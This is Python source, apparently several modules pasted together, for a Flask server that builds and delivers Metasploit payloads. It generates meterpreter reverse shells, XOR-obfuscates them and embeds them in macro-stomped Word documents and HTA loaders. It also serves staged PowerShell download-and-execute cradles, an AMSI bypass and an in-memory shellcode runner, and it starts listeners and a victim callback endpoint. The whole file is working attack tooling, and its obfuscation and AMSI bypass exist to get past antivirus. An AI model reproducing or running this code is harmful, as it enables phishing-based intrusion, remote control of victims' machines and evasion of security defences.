import base64
import hashlib
import ipaddress
import itertools
import json
import logging
import os
import re
import subprocess
import sys
from typing import Optional, Dict, List, Tuple
import olefile
from io import BytesIO
import hashlib
import json
import logging
import os
import subprocess
from time import sleep
from typing import Optional, List, Dict
import base64
import random
from flask import request
from pymetasploit3.msfrpc import MsfRpcClient

from flask import Flask, render_template, Blueprint, render_template_string, request, send_from_directory, send_file, \
    current_app, redirect

from logging.config import dictConfig

from pymetasploit3.msfrpc import MsfRpcClient

# import vba
# from hta import create_hta
# from payload import LISTENER_CONFIGS, generate_payload, get_host, PAYLOAD_DIR, setup_listener
# from powershell import encode_ps, powershell_base64

import binascii
import itertools
import logging
import os
import struct
from binascii import hexlify
from io import BytesIO
from typing import Optional, List

from olefile import olefile
from oletools.olevba import decompress_stream, copytoken_help
from pcodedmp.pcodedmp import getWord, getDWord

logger = logging.getLogger(__name__)


def findmarker(content):
    marker = ("A" * 100).encode()
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find("!".encode(), offset + len(marker))
        if offset_end != -1:
            return offset, offset_end - offset

    return -1, 0


def findmarker_old(content):
    marker = b''.join(bytes([0xAC, 0x00, int(c, 16), 0x00])
                      for c in "DEADBEEFCAFEBABE")
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find(marker, offset + len(marker))
        if offset_end != -1:
            return offset, ((offset_end + len(marker)) - offset) // 4

    return -1, 0


def replacemarker(contents, offset, encrypted_bytes_instructions):
    # First, get the existing stream bytes for comparison
    # stream.read(length * 4)
    old_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    contents = contents[:offset] + encrypted_bytes_instructions + \
        contents[offset + len(encrypted_bytes_instructions):]

    # For good measure, read them back
    # new_bytes = stream.read(length * 4)
    new_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    print(old_bytes)
    print(new_bytes)

    return contents


def get_vba_offsets(contents):
    offset = 0

    vba_offsets = {}

    module_name = ""
    module_offset = 0

    while offset < len(contents):
        tag = getWord(contents, offset, '<')
        wLength = getDWord(contents, offset + 2, '<')

        if tag == 9:
            wLength = 6
        elif tag == 3:
            wLength = 2

        match tag:
            case 26:
                module_name = contents[offset +
                                       6:offset + 6 + wLength].decode('utf-8')
                print(f"Module name: {module_name}")
            case 49:
                module_offset = getDWord(contents, offset + 6, '<')
                print(f"Module offset: {module_offset}")
                vba_offsets[module_name] = module_offset

        offset += 6
        offset += wLength

    return vba_offsets


def open_word_template(template_path: str):
    with open(template_path, 'rb') as file:
        template_file = file.read()

    file_data = BytesIO(template_file)
    ole = olefile.OleFileIO(file_data, write_mode=True)

    # Parse the VBA dir to get a hold of the offsets
    if not ole.exists("Macros/VBA/dir"):
        logger.error(f"OLE dir Macros/VBA/dir does not exist")
        return None, None

    return file_data, ole


def generate_word_file(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool) -> Optional[BytesIO]:
    file_data, ole = open_word_template(template_path)

    for x in encrypted_payloads:
        print(len(x))
        print(f"{(len(x)):04X}")
        print(','.join(str(b) for b in x))

    data_to_write = (''.join(map(
        lambda x: f"{(len(x)):04X}{binascii.hexlify(x).decode().upper()}", encrypted_payloads))).encode()

    if not file_data:
        return None

    contents = ole.openstream("WordDocument").read()
    offset, length = findmarker(contents)

    if offset != -1:
        logger.info(
            f"Marker found in document at: [{offset}] length: [{length}]")

        if length < len(data_to_write):
            logger.error(
                f"Payload is too big for document! ({len(data_to_write)} > {length})")
            return None

        contents = replacemarker(contents, offset, data_to_write)
        ole.write_stream(f"WordDocument", contents)

    if stomp_vba:
        dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())

        module_offsets = get_vba_offsets(dir_stream)

        # We have messed up the mapping between modules and OLE paths using EvilClippy, so pick the largest offset and put it in NewMacros
        biggest_offset = sorted(module_offsets.items(),
                                key=lambda x: x[1], reverse=True)[0][1]
        contents = ole.openstream(f"Macros/VBA/NewMacros").read()
        contents = contents[:biggest_offset].ljust(len(contents), b'\x00')
        ole.write_stream(f"Macros/VBA/NewMacros", contents)

        # for directory, vba_offset in module_offsets.items():
        #     contents = ole.openstream(f"Macros/VBA/{directory}").read()
        #     contents = contents[:vba_offset].ljust(len(contents), b'\x00')
        #     ole.write_stream(f"Macros/VBA/{directory}", contents)

    ole.close()
    file_data.seek(0)

    return file_data


def powershell_base64(command):
    command_bytes = command.encode('utf-16le')
    base64_encoded = base64.b64encode(command_bytes)
    return base64_encoded.decode('ascii')


def regular_base64(command):
    command_bytes = command.encode('utf-8')
    base64_encoded = base64.b64encode(command_bytes)
    return base64_encoded.decode('ascii')


def random_capitalize(input_string):
    result = ""
    for char in input_string.lower():
        if char.isalpha():
            if random.choice([True, False]):
                result += char.upper()
            else:
                result += char.lower()
        else:
            result += char

    return result


def encode_ps(command):
    return f"{random_capitalize("iex")}([{random_capitalize("System.Text.Encoding")}]::{random_capitalize("UTF8.GetString")}([{random_capitalize("System.Convert")}]::{random_capitalize("FromBase64String")}('{regular_base64(command)}')))"


def generate_word_file_old(template_path: str, encrypted_payload: bytes) -> Optional[BytesIO]:
    file_data, ole = open_word_template(template_path)

    if not file_data:
        return None

    dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())

    module_offsets = get_vba_offsets(dir_stream)

    for directory, vba_offset in module_offsets.items():
        contents = ole.openstream(f"Macros/VBA/{directory}").read()

        offset, length = findmarker(contents)

        if offset != -1:
            logger.info(
                f"Marker found in module [{directory}] at: [{offset}] length: [{length}]")

            if length < len(encrypted_payload):
                logger.error(
                    f"Payload is too big for document! ({len(encrypted_payload)} > {length})")
                return None

            encrypted_bytes_padded = encrypted_payload.ljust(length, b'\x00')
            encrypted_bytes_instructions = bytearray(
                [b for byte in encrypted_bytes_padded for b in [0xAC, 0x00, byte, 0x00]])

            contents = replacemarker(
                contents, offset, encrypted_bytes_instructions)

        contents = contents[:vba_offset].ljust(len(contents), b'\x00')
        ole.write_stream(f"Macros/VBA/{directory}", contents)

    ole.close()
    file_data.seek(0)

    return file_data


def generate_info_file(template_path: str, url: str) -> Optional[BytesIO]:
    marker_url = 'http://111.111.111.111:12345/p/info/get?pad=a'.encode()
    replacement_url = url.ljust(len(marker_url), 'a').encode()

    file_data, ole = open_word_template(template_path)

    if not file_data:
        return None

    summary_stream = ole.openstream("\x05SummaryInformation").read()

    if summary_stream.find(marker_url) != -1:
        edited_summary = summary_stream.replace(marker_url, replacement_url)

        print(binascii.hexlify(summary_stream))
        print(binascii.hexlify(edited_summary))

        ole.write_stream("\x05SummaryInformation", edited_summary)

    ole.close()
    file_data.seek(0)

    return file_data


logger = logging.getLogger(__name__)


def findmarker(content):
    marker = (b"\x41" * 100)
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find(b"\x21", offset + len(marker))
        if offset_end != -1:
            return offset, (offset_end - offset)

    return -1, 0


def replacemarker(contents, offset, encrypted_bytes_instructions):
    # First, get the existing stream bytes for comparison
    # stream.read(length * 4)
    old_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    contents = contents[:offset] + encrypted_bytes_instructions + \
        contents[offset + len(encrypted_bytes_instructions):]

    # For good measure, read them back
    # new_bytes = stream.read(length * 4)
    new_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    print(old_bytes)
    print(new_bytes)

    return contents


def create_hta(encypted_bytes):
    with open("payload_holders/hta_library", 'rb') as f:
        contents = f.read()

    offset, length = findmarker(contents)

    if length < len(encypted_bytes):
        logger.error(
            f"Payload is too big for document! ({len(encypted_bytes)} > {length})")
        return None

    contents = replacemarker(contents, offset, encypted_bytes)

    return contents


PAYLOAD_DIR = "payloads"

BASIC_LISTENER_CONFIG = {
    "PingbackSleep": 10,
    "OverrideRequestHost": True,
    "ReverseListenerBindAddress": "127.0.0.1",
    "ReverseListenerBindPort": 50000,
}

LISTENER_CONFIGS = {
    "PS_HTTPS": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "PS_TCP": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_tcp"
    },
    "VBA_32": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "VBA_64": BASIC_LISTENER_CONFIG | {
        "Payload": "windows/x64/meterpreter/reverse_winhttps",
        "HttpProxyIE": False
    },
    "ELF": BASIC_LISTENER_CONFIG | {
        "Payload": "linux/x64/meterpreter_reverse_https"
    },
}

msf_client = None

with open('./creds.txt', 'r') as f:
    pw = f.read().strip()
print(pw)
try:
    msf_client = MsfRpcClient(pw, username='python', port=55555)
except Exception as e:
    logger.error("COULD NOT CONNECT TO MsfRpcClient")
    logger.error("WILL CONTINUE WITHOUT LISTENER AUTOMATION!!!!")


def generate_payload_hash(payload_props):
    param_string = json.dumps(payload_props, sort_keys=True)
    hash_obj = hashlib.sha256(param_string.encode())
    return hash_obj.hexdigest()


def generate_payload_props(payload_name: str,
                           lhost: Optional[str],
                           lport: Optional[int],
                           format: str,
                           additional_props: Optional[List[Dict[str, str]]] = None
                           ):
    if lhost is not None and lport is not None:
        additional_props = [{
            'lhost': lhost,
            'lport': lport,
        }] + (additional_props or [])

    return {
        'payload': payload_name,
        'format': format,
        'additional': additional_props or []
    }


def generate_payload(
    payload_name: str,
    lhost: Optional[str],
    lport: Optional[int],
    format: str,
    additional_props: Optional[List[Dict[str, str]]] = None
) -> str:
    params = generate_payload_props(
        payload_name, lhost, lport, format, additional_props)
    file_hash = generate_payload_hash(params)

    output_file_name = f"{file_hash}.{format}"
    output_path = f"{PAYLOAD_DIR}/{output_file_name}"

    os.makedirs(PAYLOAD_DIR, exist_ok=True)

    if os.path.exists(output_path):
        return output_file_name

    command = [
        'msfvenom',
        '-p', payload_name,
        '-f', format
    ]

    for propset in params['additional']:
        for key, value in propset.items():
            command.append(f"{key}={value}")

    try:
        print(f"Generating payload: {command}")

        result = subprocess.run(
            command,
            capture_output=True,
            text=False,
            check=True
        )

        with open(output_path, 'wb') as f:
            f.write(result.stdout)

        return output_file_name

    except subprocess.CalledProcessError as e:
        raise Exception(f"Payload generation failed: {e.stderr.decode()}")
    except Exception as e:
        raise Exception(f"Error generating payload: {str(e)}")


def get_host():
    host = request.headers['Incoming']

    if ':' in host:
        return host.split(':')[0], int(host.split(':')[1])
    else:
        return host, 443


def get_str(item):
    if type(item) == str:
        return item

    if type(item) == bool:
        return str(item).lower()

    if type(item) == int:
        return str(item)


def setup_listener(lhost, lport, config):
    if not msf_client:
        print(f"Not setting up listener for [{lhost}:{lport}]/[{config}]")
        return

    listener_config = config | {
        "LHOST": lhost,
        "LPORT": lport,
    }

    for job_id, job in msf_client.jobs.list.items():
        if job != 'Exploit: multi/handler':
            continue

        job_info = msf_client.jobs.info(job_id)

        for config_name, config_value in listener_config.items():
            if config_name == "Payload":
                continue

            if config_name not in job_info['datastore'].keys():
                print(
                    f"Config {config_name} missing from [{job_info['datastore'].keys()}]")
                break

            if get_str(job_info['datastore'][config_name]) != get_str(config_value):
                print(
                    f"Config {config_name} mismatch in [{job_info['datastore'][config_name]}] != [{get_str(config_value)}]")
                break
        else:
            # This line is hit if all configs match
            print(f"Reusing the config: [{lhost}:{lport}]/[{config}]")
            break
    else:
        # This line is hit if no matching jobs were found
        logger.info(
            f"No matching listeners found for [{lhost}, {lport}, {config}]")

        print(f"No matching listeners found for [{lhost}, {lport}, {config}]")

        handler = msf_client.modules.use('exploit', 'multi/handler')
        payload = msf_client.modules.use('payload', listener_config['Payload'])

        handler["ExitOnSession"] = False

        for config_name, config_value in listener_config.items():
            if config_name == "Payload":
                continue

            payload[config_name] = config_value

        if len(handler.missing_required) > 0:
            print(
                f"Handler missing required configs: {handler.missing_required}")
        elif len(payload.missing_required) > 0:
            print(
                f"Payload missing required configs: {payload.missing_required}")
        else:
            print(f"Starting listener for [{lhost}, {lport}]")

            config_str = "\n".join(map(lambda t: f"{t[0]}: {t[1]}", list(
                listener_config.items()) + [("ExitOnSession", False)]))
            print(config_str)

            job_id = handler.execute(payload=payload)

            print(f"Started job id {job_id}")

            sleep(1)


dictConfig({
    'version': 1,
    'formatters': {'default': {
        'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
    }},
    'handlers': {'wsgi': {
        'class': 'logging.StreamHandler',
        'stream': 'ext://flask.logging.wsgi_errors_stream',
        'formatter': 'default'
    }},
    'root': {
        'level': 'INFO',
        'handlers': ['wsgi']
    }
})


def filter_string(input_string):
    return re.sub(r'[^a-zA-Z0-9_-]', '', input_string)


def filter_int(input_string):
    return int(re.sub(r'[^0-9]', '', input_string))


def encrypt_ps_payload(payload_file: str) -> str:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = f.read()

    # Apply transformations and create hex string
    transformed = ''
    for byte in content:
        # Apply shift of 2 and XOR with 0x75
        transformed_byte = ((byte + 2) & 0xFF) ^ 0x75
        # Format as hex with 0x prefix
        transformed += f'0x{transformed_byte:02X},'

    # Remove trailing comma
    return transformed.rstrip(',')


def encrypt_vba_payload(payload_file: str) -> str:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = f.read()

    # Apply transformations and create hex string
    transformed = ''
    i = 0
    for byte in content:
        if i % 50 == 0 and i != 0:
            transformed += " _\n"

        # Apply shift of 2 and XOR with 0x75
        transformed_byte = ((byte + 2) & 0xFF) ^ 0x75
        # Format as hex with 0x prefix
        transformed += f'{transformed_byte:d},'

        i += 1

    # Remove trailing comma
    return transformed.rstrip(',')


def encrypt_raw_payload(payload_file: str) -> bytearray:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = bytearray(f.read())

        for i in range(len(content)):
            content[i] = (((content[i] + 2) & 0xFF) ^ 0x75)

        return content


def encrypt_raw_payload_bytes(payload: bytearray) -> bytearray:
    for i in range(len(payload)):
        payload[i] = (((payload[i] + 2) & 0xFF) ^ 0x75)

    return payload


win = Blueprint('win', __name__)

WIN_PS_COMMAND = """
{% if proxy == False %}
[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($null);
{% endif %}

iex((New-Object System.Net.WebClient).DownloadString("http://{{ lhost }}:{{ lport }}/p/win/{{ type }}/{{ id }}/start"))
"""

WIN_START_TEMPLATE = """
if([Environment]::Is64BitProcess) {
    iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/bypass'));
}
else
{
    iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/loader_32'));
}
"""
WIN_BYPASS_TEMPLATE = """
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null, $true);

iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/delegate'));
"""
WIN_LOADER_32_TEMPLATE = """
&"$env:WINDIR\\sysnative\\windowspowershell\\v1.0\\powershell.exe" -c "{% if proxy == False %}[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy(`$null);{% endif %}iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/start'))"
"""
WIN_DELEGATE_TEMPLATE = """
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = (
        [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object {
                $_.GlobalAssemblyCache -And
                $_.Location.Split('\\')[-1].Equals('System.dll') }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $GetProcAddress = ($assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}})[0]

    return $GetProcAddress.Invoke(
        $null,
        @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)
    )
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
                (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
                [System.Reflection.Emit.AssemblyBuilderAccess]::Run
            ).DefineDynamicModule(
                'InMemoryModule',
                $false
            ).DefineType(
                'MyDelegateType',
                'Class, Public, Sealed, AnsiClass, AutoClass',
                [System.MulticastDelegate]
            )

    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod(
        'Invoke', 'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

function DecryptBytes {
    Param (
        $Bytes
    )

    [Byte[]] $decrypted = New-Object byte[] $Bytes.length

    for($i=0; $i -lt $Bytes.length; $i++)
    {
        $decrypted[$i] = $Bytes[$i] -bxor 0x75
        $decrypted[$i] = (($decrypted[$i] + 256) - 2) % 256
    }

    return $decrypted
}

$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])));
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])));
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int])))


$lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = {{bytes}}
[Byte[]] $buf2 = DecryptBytes($buf)


[System.Runtime.InteropServices.Marshal]::Copy($buf2, 0, $lpMem, $buf.length)

$hThread = $CreateThread.Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)
"""

WIN_VBA_OUT_TEMPLATE = """
buf = Array({{bytes}})
"""


def ps(id, stage, proxy=False):
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
        return 'Invalid stage', 400

    lhost, lport = get_host()
    host = lhost + ':' + str(lport)

    if proxy:
        payload_type = "ps_proxy"
    else:
        payload_type = "ps"

    if stage == 'bypass':
        return render_template_string(WIN_BYPASS_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'loader_32':
        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'start':
        return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'delegate':
        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS["PS_HTTPS"] | {
                "LURI": f"/ms/{clean_id}/",
                "HttpProxyIE": proxy
            }
        )

        raw_payload_file = generate_payload(
            LISTENER_CONFIGS["PS_HTTPS"]["Payload"],
            lhost,
            lport,
            'raw',
            [
                {
                    "LURI": f"/ms/{clean_id}/",
                    "HttpProxyIE": proxy
                }
            ]
        )
        ps_string = encrypt_ps_payload(raw_payload_file)
        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)


@win.route('/ps/<id>/<stage>')
def ps_noproxy(id, stage):
    return ps(id, stage)


@win.route('/ps_proxy/<id>/<stage>')
def ps_proxy(id, stage):
    return ps(id, stage, proxy=True)


@win.route('/ps/get_command', methods=['POST'])
def ps_get_command():
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    id = request.form['id']
    proxy = ('system_proxy' in request.form.keys())

    if proxy:
        ps_type = "ps_proxy"
    else:
        ps_type = "ps"

    command_text = render_template_string(
        WIN_PS_COMMAND,
        lhost=lhost,
        lport=lport,
        id=id,
        type=ps_type,
        proxy=proxy
    ).strip()

    encoded_command = encode_ps(command_text)

    return command_text + "\n\n" + encoded_command + "\n\n" + powershell_base64(encoded_command)


@win.route('/tcp/<id>/<stage>')
def tcp(id, stage):
    clean_id = filter_int(id)

    if clean_id == "":
        return "Invalid id", 400

    if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
        return 'Invalid stage', 400

    lhost, lport = get_host()
    host = lhost + ':' + str(lport)

    if stage == 'bypass':
        return render_template_string(WIN_BYPASS_TEMPLATE, host=host)

    if stage == 'loader_32':
        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=clean_id, type='tcp')

    if stage == 'start':
        return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type='tcp')

    if stage == 'delegate':
        setup_listener(
            lhost,
            clean_id,
            LISTENER_CONFIGS["PS_TCP"]
        )

        raw_payload_file = generate_payload(
            LISTENER_CONFIGS["PS_TCP"]["Payload"],
            lhost,
            clean_id,
            'raw',
            [

            ]
        )
        ps_string = encrypt_ps_payload(raw_payload_file)
        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)


@win.route('/word_form/')
def word_form():
    return render_template('word_form.html')


@win.route('/word_form/get', methods=['POST'])
def word_get():
    payload_type = request.form['type']
    stomp_vba = ('stomp_vba' in request.form.keys())
    proxy = ('system_proxy' in request.form.keys())
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    id = request.form['id']
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    if payload_type == "vba_shellcode":
        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS["VBA_32"] | {
                "LURI": f"/ms/{clean_id}_32/",
                "HttpProxyIE": proxy,
            }
        )

        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS["VBA_64"] | {
                "LURI": f"/ms/{clean_id}_64/",
                "HttpProxyIE": proxy
            }
        )

        raw_payload_file_32 = generate_payload(
            LISTENER_CONFIGS["VBA_32"]["Payload"],
            lhost,
            lport,
            'raw',
            [
                {
                    "LURI": f"/ms/{clean_id}_32/",
                    "EXITFUNC": "thread",
                    "HttpProxyIE": proxy,
                }
            ]
        )

        raw_payload_file_64 = generate_payload(
            LISTENER_CONFIGS["VBA_64"]["Payload"],
            lhost,
            lport,
            'raw',
            [
                {
                    "LURI": f"/ms/{clean_id}_64/",
                    "EXITFUNC": "thread",
                    "HttpProxyIE": proxy,
                }
            ]
        )

        encrypted_bytes_32 = encrypt_raw_payload(raw_payload_file_32)
        encrypted_bytes_64 = encrypt_raw_payload(raw_payload_file_64)
        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"

        word_file_stream = generate_word_file(
            template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
    elif payload_type == "messagebox_msf":
        raw_payload_file_32 = generate_payload(
            "windows/messagebox",
            None,
            None,
            'raw',
            [
                {
                    "Title": f"32 bit"
                }
            ]
        )

        raw_payload_file_64 = generate_payload(
            "windows/x64/messagebox",
            None,
            None,
            'raw',
            [
                {
                    "Title": f"64 bit"
                }
            ]
        )

        encrypted_bytes_32 = encrypt_raw_payload(raw_payload_file_32)
        encrypted_bytes_64 = encrypt_raw_payload(raw_payload_file_64)
        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"

        word_file_stream = generate_word_file(
            template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
    elif payload_type == "powershell_runner":
        template_path = "payload_holders/powershell_obfs_EvilClippy.doc"

        if proxy:
            ps_type = "ps_proxy"
        else:
            ps_type = "ps"

        url = bytearray(
            f"http://{lhost}:{lport}/p/win/{ps_type}/{clean_id}/start".encode())
        encrypted_bytes = encrypt_raw_payload_bytes(url)
        word_file_stream = generate_word_file(
            template_path, [encrypted_bytes], stomp_vba)
    elif payload_type == "powershell_wmi":
        template_path = "payload_holders/wmi_exec_obfs_EvilClippy.doc"

        if proxy:
            ps_type = "ps_proxy"
        else:
            ps_type = "ps"

        url = bytearray(
            f"http://{lhost}:{lport}/p/win/{ps_type}/{clean_id}/start".encode())
        encrypted_bytes = encrypt_raw_payload_bytes(url)
        word_file_stream = generate_word_file(
            template_path, [encrypted_bytes], stomp_vba)
    elif payload_type == "messagebox":
        template_path = "payload_holders/msgbox_obfs_EvilClippy.doc"

        url = bytearray(
            f"http://{lhost}:{lport}/p/win/ps/{clean_id}/start".encode())
        encrypted_bytes = encrypt_raw_payload_bytes(url)
        word_file_stream = generate_word_file(
            template_path, [encrypted_bytes], stomp_vba)
    elif payload_type == "callback":
        template_path = "payload_holders/callback_obfs_EvilClippy.doc"

        url = bytearray(f"http://{lhost}:{lport}/p/info/get".encode())
        encrypted_bytes = encrypt_raw_payload_bytes(url)
        word_file_stream = generate_word_file(
            template_path, [encrypted_bytes], stomp_vba)
    else:
        return "Invalid type", 400

    return send_file(
        word_file_stream,
        as_attachment=False,
        download_name='document.doc',
        mimetype='application/octet-stream'
    )


def gen_multiple_payloads(lhost, lport, proxy, id, config="VBA", endpoint="ms", archs=[32, 64]):
    retval = {}
    print(f"{archs=}")
    for arch in archs:
        current_config = f"{config}_{str(arch)}"
        endpoint_msfvenom = f"/{endpoint}/{id}_{str(arch)}/"
        print(f"{current_config=}")
        print(f"{endpoint_msfvenom=}")
        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS[current_config] | {
                "LURI": endpoint_msfvenom,
                "HttpProxyIE": proxy,
            }
        )
        a = generate_payload(
            LISTENER_CONFIGS[current_config]["Payload"],
            lhost,
            lport,
            'raw',
            [
                {
                    "LURI": endpoint_msfvenom,
                    "HttpProxyIE": proxy,
                }
            ]
        )
        retval[arch] = a
    return retval


@win.route('/hta/get', methods=['POST'])
def hta_get():
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    proxy = ('system_proxy' in request.form.keys())
    id = request.form['id']
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    # setup_listener(
    #     lhost,
    #     lport,
    #     LISTENER_CONFIGS["VBA_64"] | {
    #         "LURI": f"/ms/{clean_id}_64/",
    #         "HttpProxyIE": proxy,
    #     }
    # )

    # setup_listener(
    #     lhost,
    #     lport,
    #     LISTENER_CONFIGS["VBA_32"] | {
    #         "LURI": f"/ms/{clean_id}_32/",
    #         "HttpProxyIE": proxy,
    #     }
    # )

    # raw_payload_file_64 = generate_payload(
    #     LISTENER_CONFIGS["VBA_64"]["Payload"],
    #     lhost,
    #     lport,
    #     'raw',
    #     [
    #         {
    #             "LURI": f"/ms/{clean_id}_64/",
    #             "HttpProxyIE": proxy,
    #         }
    #     ]
    # )

    # raw_payload_file_32 = generate_payload(
    #     LISTENER_CONFIGS["VBA_32"]["Payload"],
    #     lhost,
    #     lport,
    #     'raw',
    #     [
    #         {
    #             "LURI": f"/ms/{clean_id}_32/",
    #             "HttpProxyIE": proxy,
    #         }
    #     ]
    # )
    payloads_generated = gen_multiple_payloads(
        lhost, lport, proxy, clean_id, config="VBA", endpoint="ms", archs=[32, 64])

    # encrypted_bytes_64 = base64.b64encode(encrypt_raw_payload(raw_payload_file_64)).decode()
    # encrypted_bytes_32 = base64.b64encode(encrypt_raw_payload(raw_payload_file_32)).decode()

    # hta = render_template("loader.hta", payload_x64=encrypted_bytes_64, payload_x32=encrypted_bytes_32)

    hta = render_template("loader.hta", payload_x64=base64.b64encode(encrypt_raw_payload(payloads_generated[64])).decode(
    ), payload_x32=base64.b64encode(encrypt_raw_payload(payloads_generated[32])).decode())

    bytes_data = hta.encode('utf-8')
    bytes_io = BytesIO(bytes_data)
    bytes_io.seek(0)

    return send_file(
        bytes_io,
        as_attachment=False,
        download_name='loader.hta',
        mimetype='application/octet-stream'
    )


lin = Blueprint('lin', __name__)


@lin.route('/elf/<id>/msf.elf')
def elf(id):
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    lhost, lport = get_host()

    setup_listener(
        lhost,
        lport,
        LISTENER_CONFIGS["ELF"] | {
            "LURI": f"/ms/{clean_id}/"
        }
    )

    elf_payload_file = generate_payload(
        LISTENER_CONFIGS["ELF"]["Payload"],
        lhost,
        lport,
        'elf',
        [
            {
                "LURI": f"/ms/{clean_id}/",
                "PrependFork": "true"
            }
        ]
    )

    return send_from_directory(directory=PAYLOAD_DIR, path=elf_payload_file, as_attachment=True, download_name='msf.elf')


info = Blueprint('info', __name__)


@info.route('/get', methods=['GET', 'POST'])
def receive_info():
    if request.form:
        current_app.logger.info(f"Received info: {request.form}")

    return "Thanks", 200


app = Flask(__name__)
app.register_blueprint(win, url_prefix='/p/win')
app.register_blueprint(lin, url_prefix='/p/lin')
app.register_blueprint(info, url_prefix='/p/info')

print(app.url_map)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=50101, debug=True)
